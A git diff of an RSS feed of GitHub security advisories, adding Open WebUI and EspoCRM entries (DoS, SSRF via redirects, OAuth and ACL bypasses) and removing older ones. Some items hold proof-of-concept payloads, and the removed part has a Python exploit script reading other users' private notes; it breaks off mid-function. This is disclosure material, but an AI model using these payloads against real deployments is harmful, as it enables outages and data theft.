@@ -7,7 +7,267 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Sat, 29 Aug 2026 10:43:36 +0000</lastBuildDate>
+    <lastBuildDate>Sun, 30 Aug 2026 09:42:21 +0000</lastBuildDate>
+    <item>
+      <title>[LOW] espocrm/espocrm — Field-level security bypass for email address field via meeting's attendees endpoint</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-hpgx-8qg3-5w7v</link>
+      <description>CWE-863
+
+Affected:
+- composer/espocrm/espocrm &lt;=10.0.3 (patched: 10.0.4)
+
+---
+
+## Summary&#13;
+ &#13;
+EspoCRM exposes attendee lists for meetings and calls through authenticated helper endpoints. The helper fetches related users, contacts, and leads with their `emailAddress` column selected. It then tries to mask hidden attendee emails — but the masking check uses the parent event scope (`Meeting` or `Call`) instead of the attendee entity's own scope (`Contact`, `Lead`, or `User`).&#13;
+ &#13;
+A user explicitly forbidden from reading `Contact.emailAddress` can still recover hidden attendee emails through the meeting or call attendees helper, because the ACL check is performed against the wrong entity type.&#13;
+ &#13;
+## Reporter&#13;
+&#13;
+**Yash Shendge (ashrexon)**&#13;
+2026-07-22</description>
+      <guid isPermaLink="false">GHSA-hpgx-8qg3-5w7v</guid>
+      <category>LOW</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Sat, 29 Aug 2026 15:27:27 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can hang the server via message deletion in a cyclic chat tree</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3cgp-3cqx-j8w2</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-835
+
+Affected:
+- pip/open-webui &gt;= 0.10.0, &lt; 0.11.1 (patched: 0.11.1)
+
+---
+
+# Any authenticated user can hang the server via message deletion in a cyclic chat tree&#13;
+&#13;
+## Summary&#13;
+Chat histories are stored as an unvalidated JSON object. After a message is deleted, the code that picks the chat's new current message walked down the `childrenIds` links without recording where it had already been. Any account with the default `user` role could store a chat whose messages list each other as children, then delete a message from it, and the walk would run forever. That walk runs on the server's request loop, so it blocks every other user's requests until the process is killed.&#13;
+&#13;
+## Preconditions&#13;
+One account with the default `user` role. No administrator rights, no additional permissions, no configuration change and no non-default setting: creating and deleting chats is available to every user out of the box. The attack runs entirely against the attacker's own chat, so no knowledge of any other user's data is needed. Versions before 0.10.0 are unaffected because neither the message-deletion endpoint nor the affected code existed.&#13;
+&#13;
+## Impact&#13;
+The walk is synchronous and runs on the asyncio event loop, so while it spins, every request from every user is blocked, including unauthenticated `/health` and administrator endpoints. External health checks and orchestrator liveness probes fail alongside the UI. This is a pure CPU pin with no list growth, so a worker consumes one full core with flat memory and has to be killed rather than being reclaimed by an out-of-memory kill. The work is not cancelled when the client disconnects, so a single fire-and-forget request is enough and the attacker can disconnect immediately. The malformed chat stays in the database, so the condition re-arms on the next deletion attempt against that chat. No data is disclosed, altered or deleted.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.1 by https://github.com/open-webui/open-webui/commit/b933292d63d12be3fd1416fe55519ddc7aa336bc. The walk now records the ids it has already passed through, so it terminates after at most one step per stored message whatever the message contents are. Upgrading fully resolves the issue, including for chats stored while the deployment was on an affected version, which become harmless once the walk terminates.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the chat-history message deletion helper in `backend/open_webui/models/chats.py`, reached from `DELETE /api/v1/chats/{id}/messages/{message_id}`. Affected setup: all builds from 0.10.0 up to and including 0.11.0.&#13;
+&#13;
+Resolving the chat's new current message after a deletion means descending to the deepest remaining child, and that descent had no notion of where it had already been, so two messages naming each other as children sent it back and forth indefinitely. The write path does not validate the structure of a chat's history, and the child-link rebuild that runs on other write paths does not apply when a chat is created, so a history whose `childrenIds` form a cycle was persisted exactly as submitted.&#13;
+&#13;
+## Proof of concept&#13;
+As a default-role user on a running instance, store one chat of roughly 300 bytes whose messages reference each other as children:&#13;
+&#13;
+```json&#13;
+{"chat":{"title":"poc","history":{"currentId":"C","messages":{&#13;
+  "A":{"id":"A","parentId":null,"role":"user","content":"a","childrenIds":["B","C"],"timestamp":1},&#13;
+  "B":{"id":"B","parentId":"A","role":"assistant","content":"b","childrenIds":["A"],"timestamp":2},&#13;
+  "C":{"id":"C","parentId":"A","role":"user","content":"c","childrenIds":[],"timestamp":3}}}}}&#13;
+```&#13;
+&#13;
+`POST /api/v1/chats/new` stores it verbatim, with the child links unchanged. A single `DELETE /api/v1/chats/{id}/messages/C` as the same user then never returns:&#13;
+&#13;
+```&#13;
+   unauthenticated GET /health -&gt; HTTP 000 after 10.007s&#13;
+   DELETE -&gt; HTTP 000 after 20.007s&#13;
+```&#13;
+&#13;
+Sampled during the hang, the worker had consumed 42.9 seconds of CPU on one fully occupied core with flat resident memory, and unauthenticated `GET /health` timed out for as long as the process lived, including after the attacker's connection closed.&#13;
+&#13;
+On 0.11.1 the same payload returns HTTP 200 in 0.011s, `/health` stays available throughout, and deleting a middle message from a well-formed four-message chain still resolves the current message correctly.&#13;
+&#13;
+## Credits&#13;
+@Classic298, who found the unguarded descent through the chat's child links, demonstrated the resulting server-wide outage end to end against a live instance, and supplied the fix.</description>
+      <guid isPermaLink="false">GHSA-3cgp-3cqx-j8w2</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sat, 29 Aug 2026 11:52:10 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Server-side fetches reach blocked and internal hosts via unvalidated HTTP redirect targets</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-5x7x-4c3c-qf5w</link>
+      <description>CVSS 5.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N) · CWE-918
+
+Affected:
+- pip/open-webui &gt;= 0.9.5, &lt;= 0.11.0 (patched: 0.11.1)
+
+---
+
+# Server-side fetches reach blocked and internal hosts via unvalidated HTTP redirect targets&#13;
+&#13;
+## Summary&#13;
+&#13;
+Open WebUI protects server-side web fetches with two controls: the operator's list of excluded hosts, and a check that refuses private and internal addresses. Neither control was applied to the destination of an HTTP redirect. On a deployment where redirect following is enabled, any authenticated user who can cause the server to fetch a URL could submit a page that redirects, and the server would fetch the redirect destination without either control being applied to it. The server therefore connects to hosts the operator excluded, and to internal addresses including loopback, private networks and cloud metadata endpoints.&#13;
+&#13;
+## Preconditions&#13;
+&#13;
+`AIOHTTP_CLIENT_ALLOW_REDIRECTS` must be set to `true`. Its default is `false`, and on the default the affected fetch paths do not follow redirects at all, so a deployment that has not changed this setting is not affected.&#13;
+&#13;
+The attacker needs an authenticated account of any role, with access to any feature that causes the server to fetch a URL. Web search, ingesting a URL into a collection, the built-in page fetch tool and image URLs in chat all reach it. No internal hostnames need to be known, because the loopback and cloud metadata addresses are fixed and identical on every deployment.&#13;
+&#13;
+Neither `ENABLE_LOCAL_WEB_FETCH` at its default of `false` nor any set of entries in `WEB_FETCH_FILTER_LIST` prevents this.&#13;
+&#13;
+## Impact&#13;
+&#13;
+An authenticated user can make the server issue requests to hosts the operator deliberately excluded, and to addresses on the internal network including loopback, private ranges and the cloud metadata endpoints of the major providers.&#13;
+&#13;
+What reaches the attacker depends on which HTTP client the fetch path uses, and is stated here as verified rather than assumed. On the paths built on `requests`, the fetched body is returned to the caller, so the response of an excluded host is readable: the built-in page fetch tool hands it to the model, and the URL ingestion endpoint returns it in its response. Those paths kept a working private-address check at connection time, so what they reach is excluded public hosts and internal names, not private IP addresses. On the paths built on aiohttp, which are the ones that reach private addresses written as IP literals, fetched content reaches the web search response, a retrievable collection, or model input as base64 through chat image URLs. A path on that client returning an attacker-chosen response verbatim to the requester was not demonstrated.&#13;
+&#13;
+The operator has no configuration that prevents this. `169.254.169.254` ships in the default excluded list, so an operator reviewing their configuration would reasonably conclude the metadata endpoint is out of reach. The documentation for the redirect setting further recommends the excluded-host list as a compensating control when enabling redirects, and that is precisely the control the redirect path skipped.&#13;
+&#13;
+## Fix&#13;
+&#13;
+Fixed in 0.11.1 by https://github.com/open-webui/open-webui/pull/27823. The excluded-host list is now evaluated once per request on both HTTP clients, where the real destination is known and a reused connection cannot skip it, so it applies to every redirect hop. The private-address check stays at connection time and is now hooked where aiohttp resolves a host, which is also reached for hosts written as IP literals.&#13;
+&#13;
+One case is not resolved by the upgrade alone. Where the server reaches the internet through a forward proxy, the private-address check sees the proxy's address rather than the final destination, so it does not constrain where the proxy is asked to connect. The excluded-host list is still applied to the destination on that path. Operators who route outbound fetches through a proxy should enforce destination restrictions on the proxy itself.&#13;
+&#13;
+## Root cause&#13;
+&#13;
+Affected components:&#13;
+&#13;
+- the web retrieval fetch paths, on both the aiohttp and `requests` clients&#13;
+- the built-in page fetch tool&#13;
+- the URL ingestion endpoint&#13;
+&#13;
+Affected setup: builds that carry the redirect-following setting, which was introduced in 0.9.5. Earlier builds have no such setting.&#13;
+&#13;
+The two controls sat at different layers, and each sat where only the originally submitted URL passes through. The excluded-host list was consulted inside URL validation, which runs once against what the user submitted, so a redirect destination never reached it on either client. The private-address check was placed inside the aiohttp resolver, and aiohttp answers a host written as an IP address itself without consulting a resolver, so for exactly those hosts the check never ran. Redirect following was added later as an option, and neither control was revisited at that point, so turning it on moved the real destination out of reach of both.&#13;
+&#13;
+## Proof of concept&#13;
+&#13;
+Both vectors were reproduced against the shipped code of 0.11.0 and confirmed closed against 0.11.1, with `AIOHTTP_CLIENT_ALLOW_REDIRECTS=true` in both runs. A local HTTP server serves a redirect and a body, DNS is stubbed so the test hostnames resolve to loopback, and the guards themselves are unmodified.&#13;
+&#13;
+Excluded-host list, redirect destination `203.0.113.1` excluded, submitted URL not excluded:&#13;
+&#13;
+```&#13;
+0.11.0  no check runs against the redirect destination, the server opens a connection to it&#13;
+0.11.1  blocked at the redirect hop before any connection is attempted&#13;
+```&#13;
+&#13;
+Private-address check, host written as an IP literal, with `ENABLE_LOCAL_WEB_FETCH` at its default of `false`:&#13;
+&#13;
+```&#13;
+0.11.0  fetch returned 'LOOPBACK-CONTENT-REACHED', no check ran&#13;
+0.11.1  blocked, non-global address 127.0.0.1&#13;
+```&#13;
+&#13;
+Instrumenting 0.11.1 on a redirect that is allowed shows both controls running against the redirect destination as well as the submitted URL, and an ordinary public fetch is unaffected.&#13;
+&#13;
+## Credits&#13;
+&#13;
+- @arpitjain099, original report: the excluded-host list is not re-applied to redirect destinations.&#13;
+- @Classic298: the private-address check is bypassed for redirect destinations written as IP literals, through aiohttp's resolver shortcut.</description>
+      <guid isPermaLink="false">GHSA-5x7x-4c3c-qf5w</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sat, 29 Aug 2026 11:49:13 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can hang the server via a cyclic chat message history</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-jqhh-cjmq-vmv6</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-835
+
+Affected:
+- pip/open-webui &gt;= 0.5.0, &lt; 0.11.1 (patched: 0.11.1)
+
+---
+
+# Any authenticated user can hang the server via a cyclic chat message history&#13;
+&#13;
+## Summary&#13;
+Chat histories are stored as an unvalidated JSON object. The walk that reconstructs a chat's message chain detected repeats using each message's own `id` field while moving through the history by map key, so a message that simply omitted `id` was never recorded as visited. A history whose messages referenced each other in a parent cycle therefore made the walk run forever. Any account with the default `user` role could store such a chat and trigger the walk, blocking the server for everyone.&#13;
+&#13;
+## Preconditions&#13;
+One account with the default `user` role. No administrator rights, no additional permissions, no configuration change and no non-default setting: creating a chat is available to every user out of the box. The attack runs entirely against the attacker's own chat, so no knowledge of any other user's data is needed. Instances where every account is trusted are affected in the sense that the fault is reachable, but require a user acting deliberately.&#13;
+&#13;
+## Impact&#13;
+The walk is synchronous and runs on the asyncio event loop, so while it spins, every request from every user is blocked, including unauthenticated `/health` and administrator endpoints. External health checks and orchestrator liveness probes fail alongside the UI. The list it appends to grows without bound, so a memory-capped deployment ends in an out-of-memory kill rather than a hang. The work is not cancelled when the client disconnects, so one fire-and-forget request is enough and the attacker can disconnect immediately. The malformed chat stays in the database, so restarting the process does not clear the condition: the next request that walks that chat hangs the new process, and recovery requires deleting the stored chat. No data is disclosed, altered or deleted.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.1 by https://github.com/open-webui/open-webui/commit/5c79ccc9e5c9efc2bc024d8f0b9757652ece929a. The walk now records the map key it is currently positioned at instead of the message's self-reported `id`, so it terminates after at most one step per stored message whatever the message contents are. Upgrading fully resolves the issue, including for chats stored while the deployment was on an affected version, which become harmless once the walk terminates.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the message-chain reconstruction helper in `backend/open_webui/utils/misc.py`, reached from every path that rebuilds a chat's history, including chat completion, per-chat statistics, context compaction, subagents and timers. Affected setup: all builds from 0.5.0 up to and including 0.11.0.&#13;
+&#13;
+The loop's visited set was keyed on the message body's `id` field while the loop itself advanced by looking the parent up as a key in the history map, so the two used different notions of identity. That `id` field is part of the stored chat object and is fully attacker-controlled, and the guard explicitly skipped recording it when absent, which left the exit condition unreachable for any message that omitted it. The write path does not validate the structure of a chat's history, so a history containing id-less messages in a parent cycle was persisted exactly as submitted.&#13;
+&#13;
+## Proof of concept&#13;
+As a default-role user on a running instance, store one chat of two messages that reference each other as parents, with the `id` field omitted:&#13;
+&#13;
+```json&#13;
+{"chat":{"title":"poc","history":{"currentId":"A","messages":{&#13;
+  "A":{"parentId":"B","role":"user","content":"a","childrenIds":[]},&#13;
+  "B":{"parentId":"A","role":"assistant","content":"b","childrenIds":[]}}}}}&#13;
+```&#13;
+&#13;
+`POST /api/v1/chats/new` stores it verbatim. A single subsequent `GET /api/v1/chats/stats/usage` as the same user then never returns. Sampled during the hang, the worker consumed one full CPU core and reached 1.86 GB resident within 60 seconds, still growing. Unauthenticated `GET /health` and administrator API calls both time out for as long as the process lives, and continue to do so after the attacker's connection closes. Restarting the server restores service until the first request that walks the stored chat, which hangs the new process the same way.&#13;
+&#13;
+On 0.11.1 the same payload returns promptly, `/health` stays available throughout, and a well-formed chat still resolves its full history.&#13;
+&#13;
+## Credits&#13;
+@YashvantHange, who reported the missing-`id` cycle in the message-chain walk, demonstrated the resulting server-wide outage end to end against a live instance, and showed that it survives both attacker disconnect and a process restart.</description>
+      <guid isPermaLink="false">GHSA-jqhh-cjmq-vmv6</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sat, 29 Aug 2026 10:57:26 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Users denied by the OAuth domain allowlist or role policy can still sign in via token exchange</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-4qg5-cxx4-g927</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) · CWE-863
+
+Affected:
+- pip/open-webui &gt;= 0.8.0, &lt; 0.11.1 (patched: 0.11.1)
+- docker/openwebui/open-webui &gt;= 0.8.0, &lt; 0.11.1 (patched: 0.11.1)
+
+---
+
+# Users denied by the OAuth domain allowlist or role policy can still sign in via token exchange&#13;
+&#13;
+## Summary&#13;
+&#13;
+Open WebUI's OAuth token exchange endpoint issues a session for a provider access token without applying the access controls that the normal OAuth login callback applies. Before 0.9.0 it skipped the email domain allowlist, and before 0.11.1 it skipped OAuth role management, so an account that the login callback would have refused could still obtain a working session through this endpoint. The endpoint also carried no request throttle of any kind before 0.11.0.&#13;
+&#13;
+## Preconditions&#13;
+&#13;
+- `ENABLE_OAUTH_TOKEN_EXCHANGE=True`. It is disabled by default, so a default deployment is not affected.&#13;
+- At least one of the skipped controls is actually in use: `OAUTH_ALLOWED_DOMAINS`, or `ENABLE_OAUTH_ROLE_MANAGEMENT` together with `OAUTH_ALLOWED_ROLES` / `OAUTH_ADMIN_ROLES`.&#13;
+- A valid, unexpired access token on the configured provider.&#13;
+- An Open WebUI account already linked to that provider subject, or an account with a matching email when `OAUTH_MERGE_ACCOUNTS_BY_EMAIL` is enabled. This endpoint never creates accounts, so a token for a subject with no existing account is rejected.&#13;
+&#13;
+## Impact&#13;
+&#13;
+An admin who narrows the domain allowlist, or an identity provider that revokes the role a user needs, expects that user to lose access at their next sign-in. The login callback does deny them. Token exchange kept issuing sessions, so the user retained working access as their existing account at its existing role. The endpoint cannot create an account and cannot raise anyone's role, so this grants continued access rather than new or elevated access.&#13;
+&#13;
+The absent throttle allowed unlimited exchange attempts, which lowers the cost of probing with leaked tokens.&#13;
+&#13;
+## Fix&#13;
+&#13;
+The domain allowlist check was added in `fb5ef978b` and released in 0.9.0. Role management was added in `e96844581` and released in 0.11.1, so the endpoint now runs the same role evaluation on the provider's response that the login callback runs, and denies a user whose reported roles match no allowed or admin role. An optional throttle was added in `453b9fb02` and released in 0.11.0.&#13;
+&#13;
+Upgrading to 0.11.1 restores the domain and role checks with no further action. The throttle stays off until a deployment sets `OAUTH_TOKEN_EXCHANGE_RATE_LIMIT` to a number, optionally with `OAUTH_TOKEN_EXCHANGE_RATE_LIMIT_WINDOW`. It keys on the client address, so where a proxy forwards a caller-controlled `X-Forwarded-For` it acts as a cost control rather than a security boundary.&#13;
+&#13;
+## Root cause&#13;
+&#13;
+The affected component is the OAuth token exchange endpoint in `backend/open_webui/routers/auths.py`, which exists in builds from 0.8.0 onward.&#13;
+&#13;
+The endpoint was added as a second entry point into the same session-issuing path the OAuth login callback uses, but it re-implemented only the identity lookup and not the policy checks surrounding it. Those checks lived inside the callback's own body rather than in shared code, so the second caller inherited none of them and each control had to be added to it separately as it was noticed.&#13;
+&#13;
+## Credits&#13;
+&#13;
+@Classic298</description>
+      <guid isPermaLink="false">GHSA-4qg5-cxx4-g927</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sat, 29 Aug 2026 10:45:07 +0000</pubDate>
+    </item>
     <item>
       <title>[HIGH] composer/composer — Composer arbitrary command execution via a malicious package's Perforce source URL</title>
       <link>https://github.com/composer/composer/security/advisories/GHSA-rvx4-ffvw-m9q3</link>
@@ -3972,560 +4232,6 @@ PhuongNA - MiSoft CyberX Team&#13;
       <category>CRITICAL</category>
       <category>espocrm/espocrm</category>
       <pubDate>Thu, 18 Jun 2026 06:57:41 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] espocrm/espocrm — Target list Opt-Out actions allow opting out record without edit access to Target List (CVE-2026-46708)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-mqp6-23xq-7q3r</link>
-      <description>CVE-2026-46708 · CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) · CWE-639, CWE-862
-
-Affected:
-- composer/espocrm &lt;= 9.3.6 (patched: 9.3.7)
-
----
-
-## Summary&#13;
-&#13;
-EspoCRM's target-list opt-out actions enforce read access on the target list itself but do not enforce read or edit access on the target contact or lead whose opt-out state is being changed. A low-privileged user who can access a shared `TargetList` can toggle the `opted_out` state of a protected contact they cannot directly read or edit.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-mqp6-23xq-7q3r</guid>
-      <category>MEDIUM</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Thu, 18 Jun 2026 06:53:32 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] espocrm/espocrm — Portal user ACL bypass exposing internal stream notes with known ID (CVE-2026-46694)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-cg9f-34hj-p238</link>
-      <description>CVE-2026-46694 · CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
-
-Affected:
-- EspoCRM &lt;=9.3.6 (patched: 9.3.7)
-
----
-
-### From vendor&#13;
-&#13;
-An attacker would need to know the note ID and have stream access to the parent record, which reduces the likelihood of exploitation in real-world scenarios.&#13;
-&#13;
-### Summary&#13;
-EspoCRM portal users can read internal stream notes (`isInternal=true`) by fetching them directly via the portal Note API endpoint. Internal notes are designed to be visible only to internal agents; they are correctly hidden from portal users in stream list responses. However, the ACL checker for direct single-Note fetches does not enforce the `isInternal` restriction, allowing any portal user with stream access to a parent record to read all of its internal notes if they know the note ID.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-cg9f-34hj-p238</guid>
-      <category>MEDIUM</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Thu, 18 Jun 2026 06:51:53 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] espocrm/espocrm — IDOR in Import exportErrors endpoint leaks CSV data of imports with known ID made by other users (CVE-2026-46691)</title>
-      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-rrcj-rhc2-ch5q</link>
-      <description>CVE-2026-46691 · CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) · CWE-862
-
-Affected:
-- composer/espocrm/espocrm &lt;= 9.3.6 (patched: 9.3.7)
-
----
-
-## From vendor&#13;
-&#13;
-An attacker would need to know the import record ID, which reduces the likelihood of exploitation in real-world scenarios.&#13;
-&#13;
-## Summary&#13;
-&#13;
-An authenticated user with Import scope access can retrieve the original CSV rows from any other user's import job by calling `POST /api/v1/Import/{id}/exportErrors` with an arbitrary import ID. The endpoint performs only a scope-level permission check and omits the entity-level ownership check that the `AccessChecker` for Import explicitly enforces and that all sibling import endpoints correctly apply. A successful call returns an `attachmentId` pointing to a CSV file containing rows from the victim's original import data.&#13;
-</description>
-      <guid isPermaLink="false">GHSA-rrcj-rhc2-ch5q</guid>
-      <category>MEDIUM</category>
-      <category>espocrm/espocrm</category>
-      <pubDate>Thu, 18 Jun 2026 06:50:34 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] pip:open-webui — Open WebUI: Any authenticated user can read other users' private notes via Socket.IO (CVE-2026-54022)</title>
-      <link>https://github.com/advisories/GHSA-8788-j68r-3cgh</link>
-      <description>CVE-2026-54022 · CVSS 5.3 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N) · CWE-706, CWE-863
-
-Affected:
-- pip/open-webui &lt;= 0.8.10 (patched: 0.8.11)
-
----
-
-### Summary
-
-The `ydoc:document:join` Socket.IO handler checks note ownership only when the `document_id` starts with `note:` (colon). However, the `YdocManager` storage layer normalizes all document IDs by replacing colons with underscores (`document_id.replace(":", "_")`). An attacker can join a document room using `note_&lt;id&gt;` (underscore) instead of `note:&lt;id&gt;` (colon), bypassing the authorization check entirely while accessing the same underlying Yjs document. The server then returns the full document state, leaking the victim's private note contents.
-
-### Details
-
-The `ydoc:document:join` handler in `socket/main.py` (line 511) only performs authorization for document IDs matching the `note:` prefix:
-
-```python
-@sio.on("ydoc:document:join")
-async def ydoc_document_join(sid, data):
-    document_id = data["document_id"]
-
-    if document_id.startswith("note:"):
-        note_id = document_id.split(":")[1]
-        note = Notes.get_note_by_id(note_id)
-        # ... ownership and AccessGrants check ...
-        # Returns early if user doesn't have access
-
-    # If document_id does NOT start with "note:", execution continues
-    # with no authorization check at all
-
-    await YDOC_MANAGER.add_user(document_id=document_id, user_id=sid)
-    await sio.enter_room(sid, f"doc_{document_id}")
-
-    ydoc = Y.Doc()
-    updates = await YDOC_MANAGER.get_updates(document_id)
-    for update in updates:
-        ydoc.apply_update(bytes(update))
-
-    state_update = ydoc.get_update()
-    await sio.emit("ydoc:document:state", {
-        "document_id": document_id,
-        "state": list(state_update),
-    }, room=sid)
-```
-
-The `YdocManager` class in `socket/utils.py` normalizes document IDs in every method by replacing colons with underscores:
-
-```python
-async def get_updates(self, document_id: str) -&gt; List[bytes]:
-    document_id = document_id.replace(":", "_")  # line 176
-    # ... returns updates keyed by normalized ID
-
-async def append_to_updates(self, document_id: str, update: bytes):
-    document_id = document_id.replace(":", "_")  # line 134
-    # ... stores update keyed by normalized ID
-```
-
-This means `note:abc123` and `note_abc123` resolve to the same storage key (`note_abc123`). When a victim opens their note, the Yjs document is stored under the normalized key. An attacker can then request the same document using the underscore variant, which skips the `startswith("note:")` authorization check but retrieves the same data from `YdocManager`.
-
-### PoC
-
-```python
-#!/usr/bin/env python3
-"""
-uv run --no-project --with requests --with "python-socketio[asyncio_client]" --with aiohttp --with pycrdt finding_15_yjs_note_disclosure.py --base-url BASE_URL --attacker-email EMAIL --attacker-password PASS --victim-email EMAIL --victim-password PASS
-
-Finding #15 — Any authenticated user can read other users' private notes via Socket.IO
-
-SUMMARY:
-  The ydoc:document:join Socket.IO handler only checks authorization for
-  document IDs starting with "note:" (colon). However, YdocManager normalizes
-  document IDs by replacing colons with underscores internally. An attacker
-  can join a room using "note_&lt;id&gt;" (underscore) to bypass the auth check,
-  while still accessing the same underlying Yjs document as "note:&lt;id&gt;".
-  Then ydoc:document:state returns the full document content.
-
-VULNERABLE CODE:
-  backend/open_webui/socket/main.py, ydoc:document:join:
-    if document_id.startswith("note:"):
-        # permission check only for colon-prefix
-    # "note_&lt;id&gt;" skips this check entirely
-
-  backend/open_webui/socket/ydoc.py, YdocManager:
-    key = document_id.replace(":", "_")  # normalizes to same storage key
-
-IMPACT:
-  Any authenticated user can read the full content of any other user's notes
-  by exploiting the namespace collision between "note:" and "note_" prefixes.
-
-REPRODUCTION:
-  1. Victim creates a private note with sensitive content.
-  2. Attacker connects via Socket.IO and authenticates.
-  3. Attacker joins room with document_id "note_&lt;victim_note_id&gt;" (underscore).
-  4. Attacker requests ydoc:document:state to get the full note content.
-
-REQUIREMENTS:
-  - Running Open WebUI instance
-  - A victim note with content
-  - Attacker user (any authenticated user)
-"""
-
-import argparse
-import asyncio
-import sys
-import requests
-import socketio
-
-
-async def victim_initialize_note(base, victim_token, note_id):
-    """Simulate victim opening the note in the UI to initialize the Yjs document."""
-    sio = socketio.AsyncClient()
-
-    await sio.connect(
-        base,
-        socketio_path="/ws/socket.io",
-        headers={"Authorization": f"Bearer {victim_token}"},
-        transports=["websocket"],
-    )
-
-    # Join using the proper note:id format (passes auth check since victim owns it)
-    doc_id = f"note:{note_id}"
-    print(f"    Joining as victim with document_id: {doc_id}")
-
-    await sio.emit("ydoc:document:join", {
-        "document_id": doc_id,
-        "user_id": "victim",
-        "user_name": "Victim",
-    })
-    await asyncio.sleep(1)
-
-    # Send a Yjs update with the note content
-    # Create a simple Yjs document with text content
-    try:
-        import pycrdt as Y
-        ydoc = Y.Doc()
-        ytext = ydoc.get("default", type=Y.Text)
-        with ydoc.transaction():
-            ytext += "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone."
-        update = ydoc.get_update()
-
-        await sio.emit("ydoc:document:update", {
-            "document_id": doc_id,
-            "update": list(update),
-        })
-        print(f"    Sent Yjs update with note content ({len(update)} bytes)")
-    except ImportError:
-        # If pycrdt not available, try y-py
-        try:
-            import y_py as Y
-            ydoc = Y.YDoc()
-            ytext = ydoc.get_text("default")
-            with ydoc.begin_transaction() as txn:
-                ytext.extend(txn, "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone.")
-            update = txn.get_update()
-
-            await sio.emit("ydoc:document:update", {
-                "document_id": doc_id,
-                "update": list(update),
-            })
-            print(f"    Sent Yjs update with note content ({len(update)} bytes)")
-        except ImportError:
-            print("    WARNING: Neither pycrdt nor y-py available, sending raw text marker")
-            # Send a minimal marker that we can detect
-            raw_update = list(b"\x01\x00\x00\x00\x00\x00\x00SECRET_NOTE_CONTENT_MARKER")
-            await sio.emit("ydoc:document:update", {
-                "document_id": doc_id,
-                "update": raw_update,
-            })
-
-    await asyncio.sleep(1)
-    await sio.disconnect()
-    print(f"    Victim disconnected")
-
-
-async def exploit(base, attacker_token, victim_note_id):
-    sio = socketio.AsyncClient()
-    result = {"state": None, "error": None, "joined": False}
-
-    @sio.on("ydoc:document:state")
-    async def on_state(data):
-        result["state"] = data
-        print(f"    [!] Received ydoc:document:state event!")
-        print(f"        document_id: {data.get('document_id', '?')}")
-        state = data.get("state", [])
-        print(f"        State size: {len(state)} bytes")
-
-    @sio.on("error")
-    async def on_error(data):
-        result["error"] = data
-        print(f"    [!] Error event: {data}")
-
-    @sio.on("*")
-    async def catch_all(event, data):
-        if event not in ("ydoc:document:state", "error"):
-            print(f"    [debug] Event: {event} Data: {str(data)[:200]}")
-
-    # Connect with auth token
-    print(f"[*] Connecting as attacker to Socket.IO...")
-    await sio.connect(
-        base,
-        socketio_path="/ws/socket.io",
-        auth={"token": attacker_token},
-        transports=["websocket"],
-    )
-
-    # Join with "note_" prefix (underscore — bypasses auth)
-    bypass_doc_id = f"note_{victim_note_id}"
-    print(f"\n[*] Step 3: Joining room with bypassed document_id: {bypass_doc_id}")
-    print(f"    (using underscore instead of colon to skip auth check)")
-
-    await sio.emit("ydoc:document:join", {
-        "document_id": bypass_doc_id,
-        "user_id": "attacker",
-        "user_name": "Attacker",
-    })
-
-    result["joined"] = True
-
-    # Wait for state response (from join handler's emit)
-    for _ in range(20):
-        await asyncio.sleep(0.5)
-        if result["state"]:
-            break
-
-    await sio.disconnect()
-    return result
-
-
-def main():
-    parser = argparse.ArgumentParser(description="Finding #15: Yjs note disclosure via namespace collision")
-    parser.add_argument("--base-url", required=True)
